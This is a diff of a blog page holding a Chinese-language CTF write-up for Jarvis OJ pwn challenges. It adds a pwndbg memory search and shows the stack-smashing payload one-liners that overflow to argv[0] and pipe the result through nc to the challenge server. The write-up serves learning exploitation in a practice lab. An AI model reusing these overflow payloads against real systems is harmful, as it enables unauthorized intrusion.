@@ -17,7 +17,7 @@
 <meta property="og:image" content="http://1nv0k3r.me/2019/01/24/jarvis-oj-pwn-做题记录/3.png">
 <meta property="og:image" content="http://1nv0k3r.me/2019/01/24/jarvis-oj-pwn-做题记录/1.png">
 <meta property="og:image" content="http://1nv0k3r.me/2019/01/24/jarvis-oj-pwn-做题记录/2.png">
-<meta property="og:updated_time" content="2019-01-25T09:49:36.253Z">
+<meta property="og:updated_time" content="2019-01-25T09:56:04.657Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Jarvis Oj Pwn 做题记录">
 <meta name="twitter:description" content="0x01 tell me something Point:100checksec: Arch:     amd64-64-little RELRO:    No RELRO Stack:    No canary found NX:       NX enabled PIE:      No PIE (0x400000) 很明显的漏洞点:int __cdecl main(int argc, con">
@@ -210,7 +210,13 @@ FORTIFY:  Enabled
 <p>栈从低地址向高地址增加, argv[0]在高地址, main函数的栈在低地址, 然后main函数的栈帧中, 地址由低向高增加, 所以大量数据填充可以让我们的输入覆盖到高地址的argv[0]</p>
 <p>输入处的开始地址为 <code>0x7fffffffdd80</code>, argv[0]的地址为 <code>0x7fffffffe30a</code></p>
 <p>计算一下距离: <code>0x7fffffffe30a - 0x7fffffffdd80 = 1418</code></p>
-<p>所以最终payload为:<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">"print((1700 * 'A' + '\x21\x0d\x40\x00\x00\x00\x00\x00') + '\n\n')"</span> | nc pwn.jarvisoj.com <span class="number">9877</span></span><br><span class="line">python -c <span class="string">"print('\x21\x0d\x40\x00\x00\x00\x00\x00' * (((0x7fffffffe30a - 0x7fffffffdd80) / 8)) + '\n\n')"</span> | nc pwn.jarvisoj.com <span class="number">9877</span></span><br></pre></td></tr></table></figure></p>
+<p>搜索一下flag的位置</p>
+<pre><code>pwndbg&gt; search /home/a/smashes
+warning: Unable to access 16000 bytes of target memory at 0x7ffff7bd2d0e, halting search.
+[stack]         0x7fffffffe230 &apos;/home/a/smashes&apos;
+[stack]         0x7fffffffe800 &apos;/home/a/smashes&apos;
+[stack]         0x7fffffffefe8 &apos;/home/a/smashes&apos;
+</code></pre><p>所以最终payload为:<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">"print((1700 * 'A' + '\x21\x0d\x40\x00\x00\x00\x00\x00') + '\n\n')"</span> | nc pwn.jarvisoj.com <span class="number">9877</span></span><br><span class="line">python -c <span class="string">"print('\x21\x0d\x40\x00\x00\x00\x00\x00' * (((0x7fffffffe30a - 0x7fffffffdd80) / 8)) + '\n\n')"</span> | nc pwn.jarvisoj.com <span class="number">9877</span></span><br></pre></td></tr></table></figure></p>
 <p>记录一下格式化字符串:</p>
 <p>格式化占位符（format placeholder），语法是：</p>
 <pre><code>%[parameter][flags][field width][.precision][length]type
